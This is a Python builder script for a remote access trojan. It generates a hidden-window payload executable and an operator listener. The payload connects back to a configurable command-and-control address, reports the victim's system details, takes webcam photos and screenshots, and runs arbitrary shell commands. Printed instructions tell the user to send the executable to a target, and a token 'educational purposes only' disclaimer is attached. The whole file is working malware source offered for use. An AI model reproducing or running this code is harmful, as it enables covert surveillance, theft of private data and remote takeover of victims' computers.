import os
import base64
import subprocess
import sys

# Configuration
YOUR_IP = "192.168.1.3"  # CHANGE THIS
PORT = 4444
LOG_FILE = "victim_data.txt"

PAYLOAD_CODE = f'''import os
import sys
import socket
import subprocess
import platform
import getpass
import uuid
import json
import time
import ctypes
import winreg
import shutil
import tempfile
import zipfile
import pyautogui
import cv2
import psutil
from threading import Thread
from cryptography.fernet import Fernet

# Configuration
C2_IP = "{YOUR_IP}"
C2_PORT = {PORT}
LOG_FILE = "{LOG_FILE}"
FERNET_KEY = Fernet.generate_key()

class VictimControl:
    def __init__(self):
        self.webcam_count = 0
        self.screenshot_count = 0
        self.cipher = Fernet(FERNET_KEY)

    def get_system_info(self):
        try:
            return {{
                "hostname": platform.node(),
                "username": getpass.getuser(),
                "os": platform.platform(),
                "cpu": {{
                    "cores": os.cpu_count(),
                    "usage": psutil.cpu_percent(interval=1)
                }},
                "ram": psutil.virtual_memory()._asdict(),
                "disks": [psutil.disk_usage(part.mountpoint)._asdict() 
                         for part in psutil.disk_partitions()],
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) 
                      for ele in range(0,8*6,8)][::-1])
            }}
        except Exception as e:
            return {{"error": str(e)}}

    def capture_webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
        except:
            return None

    def capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            buffer = np.array(screenshot)
            _, buffer = cv2.imencode('.png', buffer)
            return base64.b64encode(buffer).decode()
        except:
            return None

    def execute_command(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode(errors="ignore")
        except Exception as e:
            return str(e)

def connect_to_c2():
    rat = VictimControl()
    while True:
        try:
            with socket.socket() as s:
                s.connect((C2_IP, C2_PORT))
                s.send(json.dumps(rat.get_system_info()).encode())
                
                while True:
                    cmd = s.recv(1024).decode().strip()
                    if not cmd or cmd == "exit":
                        break
                        
                    if cmd == "webcam":
                        data = rat.capture_webcam()
                        s.send(data.encode() if data else b"WEBCAM_ERROR")
                    elif cmd == "screenshot":
                        data = rat.capture_screenshot()
                        s.send(data.encode() if data else b"SCREENSHOT_ERROR")
                    else:
                        output = rat.execute_command(cmd)
                        s.send(output.encode())
                        
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_c2()
'''

LISTENER_CODE = f'''import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    with open(filename, "wb") as f:
        f.write(base64.b64decode(content))

def start_listener():
    s = socket.socket()
    s.bind(('0.0.0.0', {PORT}))
    s.listen(1)
    print("[*] Waiting for victim... (Run payload.exe on target)")
    conn, addr = s.accept()
    print(f"[+] Connected to {{addr[0]}}")
    
    # Show initial system info
    sysinfo = json.loads(conn.recv(65535).decode())
    print("\\n=== SYSTEM INFO ===")
    print(json.dumps(sysinfo, indent=4))
    
    while True:
        cmd = input("\\nRAT> ").strip()
        if not cmd:
            continue
            
        conn.send(cmd.encode())
        
        if cmd.lower() == "exit":
            break
            
        data = conn.recv(10485760).decode()  # 10MB max
        
        if cmd == "webcam":
            save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg")
            print("[+] Webcam saved")
        elif cmd == "screenshot":
            save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png")
            print("[+] Screenshot saved")
        else:
            print(data)

if __name__ == "__main__":
    start_listener()
'''

def generate_payload():
    # Create payload file
    with open("payload.py", "w") as f:
        f.write(PAYLOAD_CODE)
    
    # Create listener file
    with open("listener.py", "w") as f:
        f.write(LISTENER_CODE)
    
    # Install required packages
    print("[*] Installing required packages...")
    subprocess.run([sys.executable, "-m", "pip", "install", 
                   "pyinstaller", "pyautogui", "opencv-python", 
                   "psutil", "numpy", "cryptography"], check=True)
    
    # Compile payload
    print("[*] Compiling payload.exe...")
    subprocess.run([
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--add-data', 'payload.py;.',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'cv2',
        '--hidden-import', 'psutil',
        '--hidden-import', 'numpy',
        '--hidden-import', 'cryptography',
        '--distpath', 'dist',
        'payload.py'
    ], check=True)
    
    print(f'''
[✅] RAT TOOL READY

[📌] INSTRUCTIONS:
1. Send dist/payload.exe to target
2. Run listener.py on your machine
3. Wait for connection

[🔥] COMMANDS:
- webcam       - Take webcam photo
- screenshot   - Capture screen
- sysinfo      - Show system info
- Any CMD command

[⚠️] IMPORTANT:
- Replace 'YOUR_IP_HERE' before generating payload
- For educational purposes only
''')

if __name__ == "__main__":
    generate_payload()